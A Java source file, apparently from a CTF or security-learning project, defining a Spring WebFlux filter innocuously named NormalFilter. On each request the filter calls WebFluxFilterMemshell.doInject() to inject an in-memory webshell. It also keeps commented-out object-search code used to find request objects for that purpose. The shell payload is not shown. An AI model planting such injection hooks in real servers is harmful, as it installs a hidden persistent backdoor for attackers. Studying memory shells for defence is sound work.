package com.example.webfluxmem;
import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import reactor.core.publisher.Mono;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

@Component
@Order(value = 2)
public class NormalFilter implements WebFilter {
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ////设置搜索类型包含Request关键字的对象
        //List<Keyword> keys = new ArrayList<>();
        //keys.add(new Keyword.Builder().setField_type("NormalFilter").build());
        //List<Blacklist> blacklists = new ArrayList<>();
        //blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
        //SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        //searcher.setBlacklists(blacklists);
        //searcher.setIs_debug(true);
        //searcher.setMax_search_depth(15);
        //searcher.setReport_save_path("E:\\CTFLearning");
        //searcher.searchObject();
        WebFluxFilterMemshell.doInject();
        return chain.filter(exchange);
    }
}
